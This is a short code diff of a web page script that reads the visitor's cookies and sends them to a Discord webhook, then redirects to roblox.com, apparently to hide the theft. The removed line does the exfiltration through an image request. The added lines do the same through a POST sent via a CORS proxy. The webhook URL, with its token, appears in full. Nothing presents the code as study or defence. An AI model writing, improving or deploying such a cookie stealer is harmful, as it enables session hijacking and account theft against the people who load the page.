@@ -1,4 +1,11 @@
 <script>
-  new Image().src = 'https://discord.com/api/webhooks/1503034360666914897/zAdKabbLpmXVZ9H7dgXnX5izNyq-upKfMwUzIrY9J1cYT5VbWj0ZzBmSVdgKdrLpeUBG?content=' + encodeURIComponent(document.cookie);
+  const webhookURL = 'https://discord.com/api/webhooks/1503034360666914897/zAdKabbLpmXVZ9H7dgXnX5izNyq-upKfMwUzIrY9J1cYT5VbWj0ZzBmSVdgKdrLpeUBG';
+  
+  fetch('https://corsproxy.io/?' + encodeURIComponent(webhookURL), {
+    method: 'POST',
+    body: JSON.stringify({ content: document.cookie }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+  
   window.location = 'https://www.roblox.com';
 </script>
